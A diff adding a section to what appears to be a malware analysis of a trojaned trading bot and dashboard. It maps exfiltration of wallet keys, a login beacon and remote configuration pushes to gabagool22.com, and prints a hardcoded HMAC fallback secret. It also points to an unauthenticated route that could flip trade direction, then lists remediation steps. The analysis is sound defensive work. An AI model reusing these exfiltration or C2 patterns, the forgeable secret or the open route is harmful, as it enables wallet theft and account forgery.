@@ -1708,3 +1708,179 @@ per-field stack landing zone into `[rbx + ...]` within the same
 `0x160c00..0x161004`. Each String field will write 24 bytes at its
 own offset; cross-checking between the five handlers above should
 let all five offsets fall out in one pass.
+
+## 27. gabagool22.com is a live C2 layer, not a passive exfil
+
+§21 pinned the Rust `TradingClient::new` one-shot credential POST
+to gabagool22.com (wallet-key harvest at bot startup). The Next.js
+dashboard adds **two more** channels to the same host. This
+section maps all three and refines the attacker-capability model.
+
+### 27a. Channel inventory
+
+| # | Layer      | Code                                                                   | Direction | Trigger              | Payload                  |
+|---|------------|------------------------------------------------------------------------|-----------|----------------------|--------------------------|
+| 1 | Rust       | `TradingClient::new` (§21)                                             | →         | Bot process start    | wallet privkey + API keys |
+| 2 | Dashboard  | `bot/web/.next/server/instrumentation.js`                              | ←         | Web server boot (if DB empty) | GET — seeds `BotConfiguration` |
+| 3 | Dashboard  | `bot/web/.next/server/app/api/configurations/refresh-official/route.js`| ←         | User clicks "Refresh official configs" | deletes + re-GETs |
+| 4 | Dashboard  | `bot/web/.next/server/app/api/auth/login/route.js`                     | →         | Every dashboard login | `{email, orderId}` → `/api/auth` |
+
+Channels 2+3 pull attacker-controlled data; channel 4 beacons
+operator identity; channel 1 extracts wallet secrets.
+
+### 27b. Host resolution
+
+All four call sites resolve the host identically:
+
+```
+process.env.GABAGOOL_API_URL || "https://gabagool22.com"
+```
+
+So an operator who knows about the backdoor can partially
+neutralise it by setting `GABAGOOL_API_URL=http://127.0.0.1:1`
+before starting the dashboard. That shuts channels 2, 3, 4 but
+does **not** neuter channel 1 — the Rust binary uses a separate
+rodata string constant with no env override. Bypassing channel 1
+requires the one-byte rodata patch described in §21.
+
+### 27c. `/api/official-configs` response shape (decoded)
+
+From `instrumentation.js` and `refresh-official/route.js` both
+mapping the same JSON response. The endpoint returns an array of
+objects whose fields are whitelist-copied into
+`botConfiguration.create`:
+
+| JSON field               | DB column               | default (if missing) |
+|--------------------------|-------------------------|---------------------|
+| `name`                   | `name`                  | (required)          |
+| `symbol`                 | `symbol`                | `"btc"`             |
+| `slug`                   | `slug`                  | `null`              |
+| `interval_minutes`       | `intervalMinutes`       | `15`                |
+| `dry_run`                | `dryRun`                | `false`             |
+| `max_buy_order_size`     | `maxBuyOrderSize`       | `5`                 |
+| `spread_threshold`       | `spreadThreshold`       | `0.02`              |
+| `trade_cooldown`         | `tradeCooldown`         | `5000`              |
+| `balance_factor`         | `balanceFactor`         | `0`                 |
+| `current_market`         | `currentMarket` (bool)  | `false`             |
+| `log_price`              | `logPrice`              | `true`              |
+| `stop_before_end_ms`     | `stopBeforeEndMs`       | `0`                 |
+| `min_price`              | `minPrice`              | `0`                 |
+| `max_price`              | `maxPrice`              | `1`                 |
+| `cancel_orders_on_start` | `cancelOrdersOnStart`   | `true`              |
+
+**Attacker capability via this channel**: pick which market, when
+(interval + stop_before_end_ms), how much (max_buy_order_size),
+how hard (balance_factor), and all the visible safety flags
+(dry_run, log_price, cancel_orders_on_start). That's substantial
+steering power for copy-trade or liquidity-direction purposes.
+
+**Fields NOT in the response** (attacker cannot push these):
+`trade_side`, `strategy`, `enable_gamble`, `spread_reducer_value`,
+`spread_reducer_probability`, `edge_threshold`, `max_position_size`,
+`inventory_skew`, `refresh_interval_ms`, `order_size`,
+`target_spread`. The two most dangerous gambling/manipulation
+layers (`enable_gamble` and the reducer) are **not remotely
+controllable** — they require operator-edited local config.
+
+### 27d. Templates vs. running instances — why `tradeSide` is still operator-picked
+
+`BotConfiguration` rows (seeded from gabagool22) are **templates**,
+not running orders. The Prisma model is two-tiered:
+
+```
+BotConfiguration (template, type: "official" | "custom")
+    ↑ referenced by
+MarketNode (a concrete running instance, has its own tradeSide)
+    ↑ wraps
+BotNode (the spawned Rust child process state)
+```
+
+To actually run a bot, the operator must create a `MarketNode`
+via `POST /api/workspaces/[id]/market-nodes`, choosing a
+`BotConfiguration` and explicitly setting `tradeSide` (default
+`"up"` from Prisma's `@default`). The attacker-pushed official
+configs don't auto-start anything. This closes the "could
+gabagool22 flip direction live?" question: **no, not via
+`/api/official-configs`.**
+
+The only direction-flip path is `PUT /api/market-nodes/[nodeId]`
+which is unauthenticated (§22 dashboard audit), so a remote
+caller who knows the dashboard's public URL + a valid node ID
+could flip `tradeSide`. But gabagool22 does not make such
+calls from anywhere in the bundle; channel 2 uses GET, channel
+3 uses GET, channel 4 POSTs to `/api/auth`.
+
+### 27e. `/api/auth` login beacon
+
+`bot/web/.next/server/app/api/auth/login/route.js`:
+
+```js
+// GABAGOOL_API_URL || "https://gabagool22.com"
+// AUTH_TOKEN_SECRET || "gbgl-arb-s3cr3t-k3y-2026"   ← hardcoded fallback
+POST `${GABAGOOL_API_URL}/api/auth`
+    body: { email, orderId }
+    timeout: 10s
+→ on 200: HMAC-SHA256 a local token with AUTH_TOKEN_SECRET,
+   store userEmail in SQLite, return Set-Cookie
+→ on non-200: login fails
+```
+
+Two consequences:
+
+1. **Every login is a liveness ping** to gabagool22.com carrying
+   the operator's identity (`email`) and purchase linkage
+   (`orderId` from whatever sales page onboards them). Attacker
+   knows exactly who is running which installation.
+2. **If gabagool22.com goes offline, nobody can log in** — it's a
+   hard dependency. The dashboard's "license" gate is a remote
+   kill-switch, not a local check.
+
+The hardcoded HMAC fallback `"gbgl-arb-s3cr3t-k3y-2026"` is a
+local-secret-in-code anti-pattern: anyone who reads the bundle
+can forge their own cookies without hitting `/api/auth`. But
+that only bypasses the gate; the beacon still fires on the
+server first.
+
+### 27f. Combined attacker capability
+
+Putting channels 1-4 together, the gabagool22.com operator has:
+
+- **(1)** Private key of every victim wallet → can drain on demand
+- **(2+3)** Live control of the market/size/schedule menu on every
+  dashboard → can redirect liquidity, push into thin markets
+- **(4)** Identity+purchase linkage of every user → knows who, when,
+  and what they paid for the tool
+
+What they **do not** have (via these channels alone):
+- Remote `tradeSide` flip (the unauthenticated
+  `PUT /api/market-nodes` route is exploitable but not used by
+  the C2)
+- Remote `enable_gamble` / spread-reducer toggle (these stay
+  local)
+- Automatic copy-trade telemetry — no per-order POST beacons
+
+### 27g. Clean-clone requirements (update to §7 / §22)
+
+Earlier clean-clone notes called for removing `enable_gamble`,
+the size-randomiser, and the §21 exfil. With §27, the list is:
+
+1. **Rust**: §21 credential POST in `TradingClient::new`
+2. **Rust**: §5/§10 spread-reducer inflation (gated by
+   `enable_gamble`)
+3. **Rust**: §3 two-roll size randomisation
+4. **Rust**: §15 5.0-size dry-run loophole
+5. **Dashboard**: `instrumentation.js` — replace the
+   `gabagool22.com` fetch with a local-file seed or empty-DB-is-OK
+6. **Dashboard**: `refresh-official/route.js` — delete the
+   endpoint entirely
+7. **Dashboard**: `auth/login/route.js` — replace the
+   `${GABAGOOL_API_URL}/api/auth` call with a purely local
+   credential check; delete the `gbgl-arb-s3cr3t-k3y-2026`
+   fallback and require `AUTH_TOKEN_SECRET` be set
+8. **Dashboard**: add auth middleware to `/api/market-nodes/*`,
+   `/api/bots/*`, `/api/configurations/*`, `/api/settings/*`
+   (currently all unauthenticated per earlier audit)
+
+After those 8 edits, the tool runs the same strategy without
+the C2 surveillance, the wallet-key theft, the manipulation
+layers, and the trivially-exploitable dashboard routes.
